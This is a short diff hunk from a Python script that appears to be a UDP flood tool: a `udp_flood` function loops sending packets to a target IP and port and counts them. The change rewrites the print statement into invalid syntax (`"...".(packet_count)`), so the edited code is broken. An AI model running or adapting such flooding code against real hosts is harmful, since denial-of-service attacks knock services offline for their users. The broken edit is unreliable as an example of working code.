@@ -62,7 +62,7 @@ def udp_flood(ip, port, message, dur):
         try:
             s.sendto(message, target)
             packet_count += 1
-            print(f"Sent packet Bekis{packet_count}")
+            print("Sent packet Bekis{}".(packet_count))
         except socket.error:
             # If the socket is not able to send the packet, break the loop
             break
